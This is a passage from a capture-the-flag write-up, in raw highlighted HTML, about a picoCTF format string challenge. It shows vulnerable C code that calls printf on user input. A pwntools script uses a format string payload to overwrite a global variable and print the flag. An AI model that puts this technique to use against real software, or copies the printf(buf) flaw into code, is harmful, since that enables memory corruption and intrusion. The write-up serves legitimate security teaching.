style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sus \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#FFEB95\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">21737573\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> main\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> buf\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1024\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">64\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  scanf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%1024s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> buf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Here's your input: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(buf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">  fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (sus \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#FFEB95\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">67616c66\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">I have NO clue how you did that, you must be a wizard. Here you go...\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Read in the flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    FILE \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">fd \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> fopen\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">flag.txt\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fgets\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> fd)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> flag)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  else\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">sus = 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%x\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> sus)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">You can do better!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So what we can see here is that it checks if \u003Ccode>sus\u003C/code> is equal to \u003Ccode>0x67616c66\u003C/code>. However, what we can see is that \u003Ccode>sus\u003C/code> is hardcoded to \u003Ccode>0x21737573\u003C/code>, which means we need to find a way to overwrite sus to pass the condition.\u003C/p>\n\u003Cp>So basically, here is plan:\u003C/p>\n\u003Cp>-> Use a basic format string with A’s and \u003Ccode>%p\u003C/code> pointer to leak data from the program\u003C/p>\n\u003Cp>-> This program is in x64, so we need to make sure we use 8 A’s to fill out the stack frame.\u003C/p>\n\u003Cp>-> We will use the %p format to leak pointers in the format string\u003C/p>\n\u003Cp>-> Here’s our basic payload: \u003Ccode>AAAAAAAA%p-%p-%p ...\u003C/code> we will repeat the use of \u003Ccode>%p\u003C/code> to leak pointer addresses to find how many arguments we need.\u003C/p>\n\u003Cp>->  We then will send a format string payload with the address of \u003Ccode>sus\u003C/code>, the format string argument(s), the value of \u003Ccode>0x67616c66\u003C/code>.\u003C/p>\n\u003Cp>-> We will use pwntools to send the payload to the elf and pass the check, which will give us flag.\u003C/p>\n\u003Cp>So let’s get started.\u003C/p>\n\u003Cp>\u003Cimg src=\"/img/writeups/2024/picoCTF2024/formatstring02.png\" alt=\"Image of info leak\">\u003C/p>\n\u003Cp>Wow! Lots of data! If we look closely we can see a pointer with the value of \u003Ccode>0x4141414141414141\u003C/code> this must be where our input is stored on the stack.\u003C/p>\n\u003Cp>Counting towards that pointer we get a argument amount of 14. Let’s find the address of \u003Ccode>sus\u003C/code>.\u003C/p>\n\u003Cp>Luckily pwntools will give the address of \u003Ccode>sus\u003C/code> through the python code \u003Ccode>elf.symbols['sus']\u003C/code>\u003C/p>\n\u003Cp>Let’s put this into a solve script:\u003C/p>\n\u003Cp>Wait? How does this work?\u003C/p>\n\u003Cp>Basically, when we send the format string payload, pwntools will turn the address of \u003Ccode>sus\u003C/code> as a pointer, and then write the value we give to it to that pointer, basically overwriting whatever initial value \u003Ccode>sus\u003C/code> had.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwnlib\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">fmtstr \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> FmtStr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> fmtstr_payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> fmtstr_split\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">context\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">binary\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">vuln\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">elf \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> ELF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">./vuln\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">libc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> elf\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">libc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> args\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">REMOTE\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">change this on your own remote instance\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> remote\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">rhea.picoctf.net\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 61865\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> process\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">elf.path\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> send_payload\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">payload\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">\tp\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">interactive\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">address \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> elf\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">symbols\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">sus\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">address\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">value \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">67616c66\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">   #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> this is the value admin needs to be\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">value\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">overwriting the sus address with the value we want\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> fmtstr_payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">14\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> {address: value}\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendlineafter\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">say?\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">recvuntil\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">I have NO clue\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan 